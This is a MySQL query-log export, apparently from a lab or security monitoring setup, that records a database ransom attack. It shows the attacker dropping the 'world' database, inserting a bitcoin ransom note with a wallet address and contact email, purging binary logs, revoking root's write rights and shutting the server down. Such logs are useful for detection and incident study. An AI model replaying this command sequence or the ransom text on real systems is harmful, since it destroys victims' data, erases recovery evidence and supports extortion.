TimeGenerated,DeviceName,ActionType,Query,RawData
"Aug 16, 2026 11:42:44 PM",corp-na01-bp123na,Query," SELECT LOGFILE_GROUP_NAME, FILE_NAME, TOTAL_EXTENTS, INITIAL_SIZE, ENGINE, EXTRA FROM INFORMATION_SCHEMA.FILES WHERE FILE_TYPE = 'UNDO LOG' AND FILE_NAME IS NOT NULL AND LOGFILE_GROUP_NAME IS NOT NULL AND LOGFILE_GROUP_NAME IN (SELECT DISTINCT LOGFILE_GROUP_NAME FROM INFORMATION_SCHEMA.FILES WHERE FILE_TYPE = 'DATAFILE' AND TABLESPACE_NAME IN (SELECT DISTINCT TABLESPACE_NAME FROM INFORMATION_SCHEMA.PARTITIONS WHERE TABLE_SCHEMA='recover_your_data' AND TABLE_NAME IN ('recover_your_data'))) GROUP BY LOGFILE_GROUP_NAME, FILE_NAME, ENGINE, TOTAL_EXTENTS, INITIAL_SIZE ORDER BY LOGFILE_GROUP_NAME","2026-08-17T05:42:44.782171Z   166 Query SELECT LOGFILE_GROUP_NAME, FILE_NAME, TOTAL_EXTENTS, INITIAL_SIZE, ENGINE, EXTRA FROM INFORMATION_SCHEMA.FILES WHERE FILE_TYPE = 'UNDO LOG' AND FILE_NAME IS NOT NULL AND LOGFILE_GROUP_NAME IS NOT NULL AND LOGFILE_GROUP_NAME IN (SELECT DISTINCT LOGFILE_GROUP_NAME FROM INFORMATION_SCHEMA.FILES WHERE FILE_TYPE = 'DATAFILE' AND TABLESPACE_NAME IN (SELECT DISTINCT TABLESPACE_NAME FROM INFORMATION_SCHEMA.PARTITIONS WHERE TABLE_SCHEMA='recover_your_data' AND TABLE_NAME IN ('recover_your_data'))) GROUP BY LOGFILE_GROUP_NAME, FILE_NAME, ENGINE, TOTAL_EXTENTS, INITIAL_SIZE ORDER BY LOGFILE_GROUP_NAME"
"Aug 16, 2026 11:42:44 PM",corp-na01-bp123na,Query, set optimizer_switch='semijoin=off',2026-08-17T05:42:44.690183Z   166 Query set optimizer_switch='semijoin=off'
"Aug 16, 2026 11:42:44 PM",corp-na01-bp123na,Query, /*M!100100 SET WAIT_TIMEOUT=DEFAULT */,2026-08-17T05:42:44.598772Z   166 Query /*M!100100 SET WAIT_TIMEOUT=DEFAULT */
"Aug 16, 2026 11:42:43 PM",corp-na01-bp123na,Query, SHOW tables,2026-08-17T05:42:43.725517Z   165 Query SHOW tables
"Aug 16, 2026 11:42:43 PM",corp-na01-bp123na,Query, USE `recover_your_data`,2026-08-17T05:42:43.634289Z   165 Query USE `recover_your_data`
"Aug 16, 2026 11:42:43 PM",corp-na01-bp123na,Query, SELECT SUM(data_length + index_length) FROM information_schema.tables WHERE table_schema = 'recover_your_data',2026-08-17T05:42:43.537952Z   165 Query SELECT SUM(data_length + index_length) FROM information_schema.tables WHERE table_schema = 'recover_your_data'
"Aug 16, 2026 11:42:43 PM",corp-na01-bp123na,Query, SET AUTOCOMMIT=0,2026-08-17T05:42:43.445757Z   165 Query SET AUTOCOMMIT=0
"Aug 16, 2026 11:42:43 PM",corp-na01-bp123na,Query, SET AUTOCOMMIT=0,2026-08-17T05:42:43.077487Z   164 Query SET AUTOCOMMIT=0
"Aug 16, 2026 11:42:42 PM",corp-na01-bp123na,Query, SHOW DATABASES,2026-08-17T05:42:41.976103Z   161 Query SHOW DATABASES
"Aug 16, 2026 11:42:42 PM",corp-na01-bp123na,Query, SET AUTOCOMMIT=0,2026-08-17T05:42:42.709454Z   163 Query SET AUTOCOMMIT=0
"Aug 16, 2026 11:42:42 PM",corp-na01-bp123na,Query, SET AUTOCOMMIT=0,2026-08-17T05:42:42.342132Z   162 Query SET AUTOCOMMIT=0
"Aug 16, 2026 11:42:42 PM",corp-na01-bp123na,Query, SET AUTOCOMMIT=0,2026-08-17T05:42:41.885764Z   161 Query SET AUTOCOMMIT=0
"Aug 16, 2026 11:42:41 PM",corp-na01-bp123na,Query, SET AUTOCOMMIT=0,2026-08-17T05:42:41.516623Z   160 Query SET AUTOCOMMIT=0
"Aug 16, 2026 11:41:25 PM",corp-na01-bp123na,Query, SET AUTOCOMMIT=0,2026-08-17T05:41:24.847507Z   158 Query SET AUTOCOMMIT=0
"Aug 16, 2026 11:07:16 PM",corp-na01-bp123na,Query, SELECT @@max_allowed_packet,2026-08-17T05:07:16.120935Z    54 Query SELECT @@max_allowed_packet
"Aug 16, 2026 10:33:17 PM",corp-na01-bp123na,Query, SELECT @@max_allowed_packet,2026-08-17T04:33:17.879414Z    48 Query SELECT @@max_allowed_packet
"Aug 16, 2026 9:47:15 PM",corp-na01-bp123na,Query, SELECT @@max_allowed_packet,2026-08-17T03:47:15.451151Z    39 Query SELECT @@max_allowed_packet
"Aug 16, 2026 8:34:21 PM",corp-na01-bp123na,Query, SET NAMES 'utf8mb4' COLLATE 'utf8mb4_general_ci',2026-08-17T02:34:20.893933Z    29 Query SET NAMES 'utf8mb4' COLLATE 'utf8mb4_general_ci'
"Aug 16, 2026 8:34:21 PM",corp-na01-bp123na,Query, set autocommit=0,2026-08-17T02:34:21.081956Z    29 Query set autocommit=0
"Aug 16, 2026 8:34:21 PM",corp-na01-bp123na,Query, SET NAMES utf8mb4,2026-08-17T02:34:20.987956Z    29 Query SET NAMES utf8mb4
"Aug 16, 2026 8:34:17 PM",corp-na01-bp123na,Query, set autocommit=0,2026-08-17T02:34:16.949081Z    28 Query set autocommit=0
"Aug 16, 2026 8:34:17 PM",corp-na01-bp123na,Query, SET NAMES utf8mb4,2026-08-17T02:34:16.854917Z    28 Query SET NAMES utf8mb4
"Aug 16, 2026 8:34:17 PM",corp-na01-bp123na,Query, CREATE TABLE `recover_your_data`.`RECOVER_YOUR_DATA_info` (`READ_ME` text) ENGINE=InnoDB DEFAULT CHARSET=utf8,2026-08-17T02:34:17.231411Z    28 Query CREATE TABLE `recover_your_data`.`RECOVER_YOUR_DATA_info` (`READ_ME` text) ENGINE=InnoDB DEFAULT CHARSET=utf8
"Aug 16, 2026 8:34:16 PM",corp-na01-bp123na,Query, SET NAMES 'utf8mb4' COLLATE 'utf8mb4_general_ci',2026-08-17T02:34:16.760669Z    28 Query SET NAMES 'utf8mb4' COLLATE 'utf8mb4_general_ci'
"Aug 16, 2026 8:34:13 PM",corp-na01-bp123na,Query, CREATE TABLE `recover_your_data`.`RECOVER_YOUR_DATA_info` (`READ_ME` text) ENGINE=InnoDB DEFAULT CHARSET=utf8,2026-08-17T02:34:13.087353Z    27 Query CREATE TABLE `recover_your_data`.`RECOVER_YOUR_DATA_info` (`READ_ME` text) ENGINE=InnoDB DEFAULT CHARSET=utf8
"Aug 16, 2026 8:34:12 PM",corp-na01-bp123na,Query, SET NAMES utf8mb4,2026-08-17T02:34:12.694573Z    27 Query SET NAMES utf8mb4
"Aug 16, 2026 8:34:12 PM",corp-na01-bp123na,Query, set autocommit=0,2026-08-17T02:34:12.792770Z    27 Query set autocommit=0
"Aug 16, 2026 8:34:12 PM",corp-na01-bp123na,Query, SET NAMES 'utf8mb4' COLLATE 'utf8mb4_general_ci',2026-08-17T02:34:12.596314Z    27 Query SET NAMES 'utf8mb4' COLLATE 'utf8mb4_general_ci'
"Aug 16, 2026 8:34:09 PM",corp-na01-bp123na,Query, CREATE TABLE `recover_your_data`.`RECOVER_YOUR_DATA_info` (`READ_ME` text) ENGINE=InnoDB DEFAULT CHARSET=utf8,2026-08-17T02:34:08.884555Z    26 Query CREATE TABLE `recover_your_data`.`RECOVER_YOUR_DATA_info` (`READ_ME` text) ENGINE=InnoDB DEFAULT CHARSET=utf8
"Aug 16, 2026 8:34:08 PM",corp-na01-bp123na,Query, set autocommit=0,2026-08-17T02:34:08.601964Z    26 Query set autocommit=0
"Aug 16, 2026 8:34:08 PM",corp-na01-bp123na,Query, SET NAMES 'utf8mb4' COLLATE 'utf8mb4_general_ci',2026-08-17T02:34:08.413543Z    26 Query SET NAMES 'utf8mb4' COLLATE 'utf8mb4_general_ci'
"Aug 16, 2026 8:34:08 PM",corp-na01-bp123na,Query, SET NAMES utf8mb4,2026-08-17T02:34:08.507779Z    26 Query SET NAMES utf8mb4
"Aug 16, 2026 8:34:04 PM",corp-na01-bp123na,Query, SET NAMES utf8mb4,2026-08-17T02:34:04.361106Z    25 Query SET NAMES utf8mb4
"Aug 16, 2026 8:34:04 PM",corp-na01-bp123na,Query, set autocommit=0,2026-08-17T02:34:04.455213Z    25 Query set autocommit=0
"Aug 16, 2026 8:34:04 PM",corp-na01-bp123na,Query, CREATE TABLE `recover_your_data`.`RECOVER_YOUR_DATA_info` (`READ_ME` text) ENGINE=InnoDB DEFAULT CHARSET=utf8,2026-08-17T02:34:04.737464Z    25 Query CREATE TABLE `recover_your_data`.`RECOVER_YOUR_DATA_info` (`READ_ME` text) ENGINE=InnoDB DEFAULT CHARSET=utf8
"Aug 16, 2026 8:34:04 PM",corp-na01-bp123na,Query, SET NAMES 'utf8mb4' COLLATE 'utf8mb4_general_ci',2026-08-17T02:34:04.266946Z    25 Query SET NAMES 'utf8mb4' COLLATE 'utf8mb4_general_ci'
"Aug 16, 2026 8:34:00 PM",corp-na01-bp123na,Query, SET NAMES utf8mb4,2026-08-17T02:34:00.221585Z    24 Query SET NAMES utf8mb4
"Aug 16, 2026 8:34:00 PM",corp-na01-bp123na,Query, CREATE TABLE `recover_your_data`.`RECOVER_YOUR_DATA_info` (`READ_ME` text) ENGINE=InnoDB DEFAULT CHARSET=utf8,2026-08-17T02:34:00.600810Z    24 Query CREATE TABLE `recover_your_data`.`RECOVER_YOUR_DATA_info` (`READ_ME` text) ENGINE=InnoDB DEFAULT CHARSET=utf8
"Aug 16, 2026 8:34:00 PM",corp-na01-bp123na,Query, set autocommit=0,2026-08-17T02:34:00.316584Z    24 Query set autocommit=0
"Aug 16, 2026 8:34:00 PM",corp-na01-bp123na,Query, SET NAMES 'utf8mb4' COLLATE 'utf8mb4_general_ci',2026-08-17T02:34:00.126885Z    24 Query SET NAMES 'utf8mb4' COLLATE 'utf8mb4_general_ci'
"Aug 16, 2026 8:33:56 PM",corp-na01-bp123na,Query, CREATE TABLE `recover_your_data`.`RECOVER_YOUR_DATA_info` (`READ_ME` text) ENGINE=InnoDB DEFAULT CHARSET=utf8,2026-08-17T02:33:56.456424Z    23 Query CREATE TABLE `recover_your_data`.`RECOVER_YOUR_DATA_info` (`READ_ME` text) ENGINE=InnoDB DEFAULT CHARSET=utf8
"Aug 16, 2026 8:33:56 PM",corp-na01-bp123na,Query, set autocommit=0,2026-08-17T02:33:56.160091Z    23 Query set autocommit=0
"Aug 16, 2026 8:33:56 PM",corp-na01-bp123na,Query, SET NAMES 'utf8mb4' COLLATE 'utf8mb4_general_ci',2026-08-17T02:33:55.961806Z    23 Query SET NAMES 'utf8mb4' COLLATE 'utf8mb4_general_ci'
"Aug 16, 2026 8:33:56 PM",corp-na01-bp123na,Query, SET NAMES utf8mb4,2026-08-17T02:33:56.060541Z    23 Query SET NAMES utf8mb4
"Aug 16, 2026 8:33:52 PM",corp-na01-bp123na,Query, set autocommit=0,2026-08-17T02:33:51.989508Z    22 Query set autocommit=0
"Aug 16, 2026 8:33:52 PM",corp-na01-bp123na,Query, CREATE TABLE `recover_your_data`.`RECOVER_YOUR_DATA_info` (`READ_ME` text) ENGINE=InnoDB DEFAULT CHARSET=utf8,2026-08-17T02:33:52.271975Z    22 Query CREATE TABLE `recover_your_data`.`RECOVER_YOUR_DATA_info` (`READ_ME` text) ENGINE=InnoDB DEFAULT CHARSET=utf8
"Aug 16, 2026 8:33:52 PM",corp-na01-bp123na,Query, SET NAMES utf8mb4,2026-08-17T02:33:51.895019Z    22 Query SET NAMES utf8mb4
"Aug 16, 2026 8:33:51 PM",corp-na01-bp123na,Query, SET NAMES 'utf8mb4' COLLATE 'utf8mb4_general_ci',2026-08-17T02:33:51.800926Z    22 Query SET NAMES 'utf8mb4' COLLATE 'utf8mb4_general_ci'
"Aug 16, 2026 8:33:48 PM",corp-na01-bp123na,Query, CREATE TABLE `recover_your_data`.`RECOVER_YOUR_DATA_info` (`READ_ME` text) ENGINE=InnoDB DEFAULT CHARSET=utf8,2026-08-17T02:33:48.130717Z    21 Query CREATE TABLE `recover_your_data`.`RECOVER_YOUR_DATA_info` (`READ_ME` text) ENGINE=InnoDB DEFAULT CHARSET=utf8
"Aug 16, 2026 8:33:48 PM",corp-na01-bp123na,Query, set autocommit=0,2026-08-17T02:33:47.858179Z    21 Query set autocommit=0
"Aug 16, 2026 8:33:47 PM",corp-na01-bp123na,Query, SET NAMES utf8mb4,2026-08-17T02:33:47.767351Z    21 Query SET NAMES utf8mb4
"Aug 16, 2026 8:33:47 PM",corp-na01-bp123na,Query, SET NAMES 'utf8mb4' COLLATE 'utf8mb4_general_ci',2026-08-17T02:33:47.676533Z    21 Query SET NAMES 'utf8mb4' COLLATE 'utf8mb4_general_ci'
"Aug 16, 2026 8:33:44 PM",corp-na01-bp123na,Query, CREATE TABLE `recover_your_data`.`RECOVER_YOUR_DATA_info` (`READ_ME` text) ENGINE=InnoDB DEFAULT CHARSET=utf8,2026-08-17T02:33:44.032266Z    20 Query CREATE TABLE `recover_your_data`.`RECOVER_YOUR_DATA_info` (`READ_ME` text) ENGINE=InnoDB DEFAULT CHARSET=utf8
"Aug 16, 2026 8:33:43 PM",corp-na01-bp123na,Query, SET NAMES utf8mb4,2026-08-17T02:33:43.669851Z    20 Query SET NAMES utf8mb4
"Aug 16, 2026 8:33:43 PM",corp-na01-bp123na,Query, SET NAMES 'utf8mb4' COLLATE 'utf8mb4_general_ci',2026-08-17T02:33:43.579198Z    20 Query SET NAMES 'utf8mb4' COLLATE 'utf8mb4_general_ci'
"Aug 16, 2026 8:33:43 PM",corp-na01-bp123na,Query, set autocommit=0,2026-08-17T02:33:43.760461Z    20 Query set autocommit=0
"Aug 16, 2026 8:33:40 PM",corp-na01-bp123na,Query, CREATE TABLE `recover_your_data`.`RECOVER_YOUR_DATA_info` (`READ_ME` text) ENGINE=InnoDB DEFAULT CHARSET=utf8,2026-08-17T02:33:39.930835Z    18 Query CREATE TABLE `recover_your_data`.`RECOVER_YOUR_DATA_info` (`READ_ME` text) ENGINE=InnoDB DEFAULT CHARSET=utf8
"Aug 16, 2026 8:33:37 PM",corp-na01-bp123na,Query, use `recover_your_data`,2026-08-17T02:33:37.096233Z    19 Query use `recover_your_data`
"Aug 16, 2026 8:33:37 PM",corp-na01-bp123na,Query, select @@collation_database,2026-08-17T02:33:37.187124Z    19 Query select @@collation_database
"Aug 16, 2026 8:33:37 PM",corp-na01-bp123na,Query, SET SESSION character_set_results = 'binary',2026-08-17T02:33:37.004137Z    19 Query SET SESSION character_set_results = 'binary'
"Aug 16, 2026 8:33:37 PM",corp-na01-bp123na,Query, SELECT /*!40001 SQL_NO_CACHE */ * FROM `recover_your_data`,2026-08-17T02:33:36.912632Z    19 Query SELECT /*!40001 SQL_NO_CACHE */ * FROM `recover_your_data`
"Aug 16, 2026 8:33:37 PM",corp-na01-bp123na,Query, SET SESSION character_set_results = 'utf8mb4',2026-08-17T02:33:37.370560Z    19 Query SET SESSION character_set_results = 'utf8mb4'
"Aug 16, 2026 8:33:37 PM",corp-na01-bp123na,Query, SHOW TRIGGERS LIKE 'recover\_your\_data',2026-08-17T02:33:37.278098Z    19 Query SHOW TRIGGERS LIKE 'recover\_your\_data'
"Aug 16, 2026 8:33:37 PM",corp-na01-bp123na,Query, UNLOCK TABLES,2026-08-17T02:33:37.461471Z    19 Query UNLOCK TABLES
"Aug 16, 2026 8:33:36 PM",corp-na01-bp123na,Query, show create table `recover_your_data`,2026-08-17T02:33:36.544223Z    19 Query show create table `recover_your_data`
"Aug 16, 2026 8:33:36 PM",corp-na01-bp123na,Query, show tables,2026-08-17T02:33:36.081564Z    19 Query show tables
"Aug 16, 2026 8:33:36 PM",corp-na01-bp123na,Query, SHOW VARIABLES LIKE 'ndbinfo\_version',2026-08-17T02:33:35.807464Z    19 Query SHOW VARIABLES LIKE 'ndbinfo\_version'
"Aug 16, 2026 8:33:36 PM",corp-na01-bp123na,Query, show fields from `recover_your_data`,2026-08-17T02:33:36.726689Z    19 Query show fields from `recover_your_data`
"Aug 16, 2026 8:33:36 PM",corp-na01-bp123na,Query, SHOW CREATE DATABASE IF NOT EXISTS `recover_your_data`,2026-08-17T02:33:35.990471Z    19 Query SHOW CREATE DATABASE IF NOT EXISTS `recover_your_data`
"Aug 16, 2026 8:33:36 PM",corp-na01-bp123na,Query, show table status like 'recover\_your\_data',2026-08-17T02:33:36.270219Z    19 Query show table status like 'recover\_your\_data'
"Aug 16, 2026 8:33:36 PM",corp-na01-bp123na,Query, SET SESSION character_set_results = 'binary',2026-08-17T02:33:36.453291Z    19 Query SET SESSION character_set_results = 'binary'
"Aug 16, 2026 8:33:36 PM",corp-na01-bp123na,Query, SET SESSION character_set_results = 'utf8mb4',2026-08-17T02:33:36.635684Z    19 Query SET SESSION character_set_results = 'utf8mb4'
"Aug 16, 2026 8:33:36 PM",corp-na01-bp123na,Query, SET SQL_QUOTE_SHOW_CREATE=1,2026-08-17T02:33:36.362239Z    19 Query SET SQL_QUOTE_SHOW_CREATE=1
"Aug 16, 2026 8:33:36 PM",corp-na01-bp123na,Query, show fields from `recover_your_data`,2026-08-17T02:33:36.820457Z    19 Query show fields from `recover_your_data`
"Aug 16, 2026 8:33:36 PM",corp-na01-bp123na,Query, LOCK TABLES `recover_your_data` READ /*!32311 LOCAL */,2026-08-17T02:33:36.173336Z    19 Query LOCK TABLES `recover_your_data` READ /*!32311 LOCAL */
"Aug 16, 2026 8:33:35 PM",corp-na01-bp123na,Query," SELECT DISTINCT TABLESPACE_NAME, FILE_NAME, LOGFILE_GROUP_NAME, EXTENT_SIZE, INITIAL_SIZE, ENGINE FROM INFORMATION_SCHEMA.FILES WHERE FILE_TYPE = 'DATAFILE' AND TABLESPACE_NAME IN (SELECT DISTINCT TABLESPACE_NAME FROM INFORMATION_SCHEMA.PARTITIONS WHERE TABLE_SCHEMA IN ('recover_your_data')) ORDER BY TABLESPACE_NAME, LOGFILE_GROUP_NAME","2026-08-17T02:33:35.715370Z    19 Query SELECT DISTINCT TABLESPACE_NAME, FILE_NAME, LOGFILE_GROUP_NAME, EXTENT_SIZE, INITIAL_SIZE, ENGINE FROM INFORMATION_SCHEMA.FILES WHERE FILE_TYPE = 'DATAFILE' AND TABLESPACE_NAME IN (SELECT DISTINCT TABLESPACE_NAME FROM INFORMATION_SCHEMA.PARTITIONS WHERE TABLE_SCHEMA IN ('recover_your_data')) ORDER BY TABLESPACE_NAME, LOGFILE_GROUP_NAME"
"Aug 16, 2026 8:33:35 PM",corp-na01-bp123na,Query, /*!40100 SET @@SQL_MODE='' */,2026-08-17T02:33:35.143569Z    19 Query /*!40100 SET @@SQL_MODE='' */
"Aug 16, 2026 8:33:35 PM",corp-na01-bp123na,Query, SHOW VARIABLES LIKE 'gtid\_mode',2026-08-17T02:33:35.508726Z    19 Query SHOW VARIABLES LIKE 'gtid\_mode'
"Aug 16, 2026 8:33:35 PM",corp-na01-bp123na,Query," SET SESSION NET_READ_TIMEOUT= 700, SESSION NET_WRITE_TIMEOUT= 700","2026-08-17T02:33:35.417372Z    19 Query SET SESSION NET_READ_TIMEOUT= 700, SESSION NET_WRITE_TIMEOUT= 700"
"Aug 16, 2026 8:33:35 PM",corp-na01-bp123na,Query," SELECT LOGFILE_GROUP_NAME, FILE_NAME, TOTAL_EXTENTS, INITIAL_SIZE, ENGINE, EXTRA FROM INFORMATION_SCHEMA.FILES WHERE FILE_TYPE = 'UNDO LOG' AND FILE_NAME IS NOT NULL AND LOGFILE_GROUP_NAME IS NOT NULL AND LOGFILE_GROUP_NAME IN (SELECT DISTINCT LOGFILE_GROUP_NAME FROM INFORMATION_SCHEMA.FILES WHERE FILE_TYPE = 'DATAFILE' AND TABLESPACE_NAME IN (SELECT DISTINCT TABLESPACE_NAME FROM INFORMATION_SCHEMA.PARTITIONS WHERE TABLE_SCHEMA IN ('recover_your_data'))) GROUP BY LOGFILE_GROUP_NAME, FILE_NAME, ENGINE, TOTAL_EXTENTS, INITIAL_SIZE ORDER BY LOGFILE_GROUP_NAME","2026-08-17T02:33:35.618277Z    19 Query SELECT LOGFILE_GROUP_NAME, FILE_NAME, TOTAL_EXTENTS, INITIAL_SIZE, ENGINE, EXTRA FROM INFORMATION_SCHEMA.FILES WHERE FILE_TYPE = 'UNDO LOG' AND FILE_NAME IS NOT NULL AND LOGFILE_GROUP_NAME IS NOT NULL AND LOGFILE_GROUP_NAME IN (SELECT DISTINCT LOGFILE_GROUP_NAME FROM INFORMATION_SCHEMA.FILES WHERE FILE_TYPE = 'DATAFILE' AND TABLESPACE_NAME IN (SELECT DISTINCT TABLESPACE_NAME FROM INFORMATION_SCHEMA.PARTITIONS WHERE TABLE_SCHEMA IN ('recover_your_data'))) GROUP BY LOGFILE_GROUP_NAME, FILE_NAME, ENGINE, TOTAL_EXTENTS, INITIAL_SIZE ORDER BY LOGFILE_GROUP_NAME"
"Aug 16, 2026 8:33:35 PM",corp-na01-bp123na,Query, /*!40103 SET TIME_ZONE='+00:00' */,2026-08-17T02:33:35.234542Z    19 Query /*!40103 SET TIME_ZONE='+00:00' */
"Aug 16, 2026 8:33:35 PM",corp-na01-bp123na,Query, /*!80000 SET SESSION information_schema_stats_expiry=0 */,2026-08-17T02:33:35.325547Z    19 Query /*!80000 SET SESSION information_schema_stats_expiry=0 */
"Aug 16, 2026 8:33:34 PM",corp-na01-bp123na,Query, SHOW TABLES FROM `recover_your_data`,2026-08-17T02:33:34.350472Z    18 Query SHOW TABLES FROM `recover_your_data`
"Aug 16, 2026 8:33:34 PM",corp-na01-bp123na,Query, commit,2026-08-17T02:33:34.445872Z    18 Query commit
"Aug 16, 2026 8:33:34 PM",corp-na01-bp123na,Query, commit,2026-08-17T02:33:34.162161Z    18 Query commit
"Aug 16, 2026 8:33:34 PM",corp-na01-bp123na,Query, SHOW TABLES FROM `recover_your_data`,2026-08-17T02:33:34.045118Z    18 Query SHOW TABLES FROM `recover_your_data`
"Aug 16, 2026 8:33:34 PM",corp-na01-bp123na,Query, commit,2026-08-17T02:33:33.856468Z    18 Query commit
"Aug 16, 2026 8:33:33 PM",corp-na01-bp123na,Query, SET NAMES 'utf8mb4' COLLATE 'utf8mb4_general_ci',2026-08-17T02:33:33.013079Z    18 Query SET NAMES 'utf8mb4' COLLATE 'utf8mb4_general_ci'
"Aug 16, 2026 8:33:33 PM",corp-na01-bp123na,Query, SHOW DATABASES,2026-08-17T02:33:33.761558Z    18 Query SHOW DATABASES
"Aug 16, 2026 8:33:33 PM",corp-na01-bp123na,Query, SET NAMES utf8mb4,2026-08-17T02:33:33.123203Z    18 Query SET NAMES utf8mb4
"Aug 16, 2026 8:33:33 PM",corp-na01-bp123na,Query, set autocommit=0,2026-08-17T02:33:33.218774Z    18 Query set autocommit=0
"Aug 16, 2026 8:33:33 PM",corp-na01-bp123na,Query, SHOW DATABASES LIKE 'mat_server',2026-08-17T02:33:33.410674Z    18 Query SHOW DATABASES LIKE 'mat_server'
"Aug 16, 2026 8:33:33 PM",corp-na01-bp123na,Query, commit,2026-08-17T02:33:33.573132Z    18 Query commit
"Aug 16, 2026 8:27:16 PM",corp-na01-bp123na,Query, SELECT @@max_allowed_packet,2026-08-17T02:27:16.077025Z    17 Query SELECT @@max_allowed_packet
"Aug 14, 2026 6:20:44 PM",corp-na01-bp123na,Query, SHUTDOWN,2026-08-15T00:20:44.429500Z   105 Query SHUTDOWN
"Aug 14, 2026 6:20:44 PM",corp-na01-bp123na,Query, SET AUTOCOMMIT=0,2026-08-15T00:20:43.872402Z   104 Query SET AUTOCOMMIT=0
"Aug 14, 2026 6:20:44 PM",corp-na01-bp123na,Query, SET AUTOCOMMIT=0,2026-08-15T00:20:44.338951Z   105 Query SET AUTOCOMMIT=0
"Aug 14, 2026 6:20:44 PM",corp-na01-bp123na,Query, ,2026-08-15T00:20:44.430751Z   105 Query 
"Aug 14, 2026 6:20:44 PM",corp-na01-bp123na,Query," REVOKE INSERT, UPDATE, DELETE, DROP, CREATE ON *.* FROM `root`@'%'","2026-08-15T00:20:43.965954Z   104 Query REVOKE INSERT, UPDATE, DELETE, DROP, CREATE ON *.* FROM `root`@'%'"
"Aug 14, 2026 6:20:43 PM",corp-na01-bp123na,Query, PURGE BINARY LOGS TO 'josh-mde-lab-bin.000001',2026-08-15T00:20:43.468873Z   103 Query PURGE BINARY LOGS TO 'josh-mde-lab-bin.000001'
"Aug 14, 2026 6:20:43 PM",corp-na01-bp123na,Query, SET AUTOCOMMIT=0,2026-08-15T00:20:43.290209Z   103 Query SET AUTOCOMMIT=0
"Aug 14, 2026 6:20:43 PM",corp-na01-bp123na,Query, SHOW MASTER STATUS,2026-08-15T00:20:43.379711Z   103 Query SHOW MASTER STATUS
"Aug 14, 2026 6:20:42 PM",corp-na01-bp123na,Query, INSERT INTO RECOVER_YOUR_DATA (text) VALUES (' (for more information visit https://bit.ly/22mysql) After payment send mail to ak+2ne16@onionmail.org and we will provide a link for you to download your data. Your DATAID is: 2NE16'),2026-08-15T00:20:42.290489Z   101 Query INSERT INTO RECOVER_YOUR_DATA (text) VALUES (' (for more information visit https://bit.ly/22mysql) After payment send mail to ak+2ne16@onionmail.org and we will provide a link for you to download your data. Your DATAID is: 2NE16')
"Aug 14, 2026 6:20:42 PM",corp-na01-bp123na,Query," INSERT INTO RECOVER_YOUR_DATA (text) VALUES ('All your data was backed up by us. You must pay 0.0135 bitcoin to bc1q7jps5432akuflg9flw2vu6hgmmj5hrrdu6c5gm or in 48 hours, your data will be publicly disclosed and deleted. ')","2026-08-15T00:20:42.167901Z   101 Query INSERT INTO RECOVER_YOUR_DATA (text) VALUES ('All your data was backed up by us. You must pay 0.0135 bitcoin to bc1q7jps5432akuflg9flw2vu6hgmmj5hrrdu6c5gm or in 48 hours, your data will be publicly disclosed and deleted. ')"
"Aug 14, 2026 6:20:42 PM",corp-na01-bp123na,Query, RESET MASTER,2026-08-15T00:20:42.860808Z   102 Query RESET MASTER
"Aug 14, 2026 6:20:42 PM",corp-na01-bp123na,Query, SHOW tables,2026-08-15T00:20:41.885893Z   101 Query SHOW tables
"Aug 14, 2026 6:20:42 PM",corp-na01-bp123na,Query, CREATE TABLE IF NOT EXISTS RECOVER_YOUR_DATA (text VARCHAR(255)),2026-08-15T00:20:41.982414Z   101 Query CREATE TABLE IF NOT EXISTS RECOVER_YOUR_DATA (text VARCHAR(255))
"Aug 14, 2026 6:20:42 PM",corp-na01-bp123na,Query, SET AUTOCOMMIT=0,2026-08-15T00:20:42.767968Z   102 Query SET AUTOCOMMIT=0
"Aug 14, 2026 6:20:42 PM",corp-na01-bp123na,Query, COMMIT,2026-08-15T00:20:42.391647Z   101 Query COMMIT
"Aug 14, 2026 6:20:41 PM",corp-na01-bp123na,Query, DROP DATABASE `world`,2026-08-15T00:20:40.936573Z   100 Query DROP DATABASE `world`
"Aug 14, 2026 6:20:41 PM",corp-na01-bp123na,Query, USE RECOVER_YOUR_DATA,2026-08-15T00:20:41.796256Z   101 Query USE RECOVER_YOUR_DATA
"Aug 14, 2026 6:20:41 PM",corp-na01-bp123na,Query, SET AUTOCOMMIT=0,2026-08-15T00:20:41.486926Z   101 Query SET AUTOCOMMIT=0
"Aug 14, 2026 6:20:41 PM",corp-na01-bp123na,Query, CREATE DATABASE IF NOT EXISTS RECOVER_YOUR_DATA,2026-08-15T00:20:41.579128Z   101 Query CREATE DATABASE IF NOT EXISTS RECOVER_YOUR_DATA
"Aug 14, 2026 6:20:41 PM",corp-na01-bp123na,Query, COMMIT,2026-08-15T00:20:41.049502Z   100 Query COMMIT
